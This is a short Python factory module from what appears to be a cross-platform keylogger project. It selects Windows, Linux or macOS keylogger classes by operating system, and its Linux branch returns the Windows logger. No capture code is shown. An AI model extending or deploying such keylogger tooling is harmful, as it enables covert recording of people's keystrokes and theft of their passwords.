import platform
from implementations.loggers.windows_key_logger import WindowsKeyLogger
from implementations.loggers.linux_key_logger import LinuxKeyLogger
from implementations.loggers.mac_key_logger import MacKeyLogger
from interfaces.i_writer import IWriter

class KeyLoggerFactory:
    @staticmethod
    def create_logger(writer: IWriter):
        system = platform.system().lower()
        if system == 'windows':
            return WindowsKeyLogger(writer)
        elif system == 'linux':
            return WindowsKeyLogger(writer)
            #return LinuxKeyLogger(writer)
        elif system == 'darwin':  # macOS
            return MacKeyLogger(writer)
        else:
            raise NotImplementedError(f"No keylogger implementation for {system}")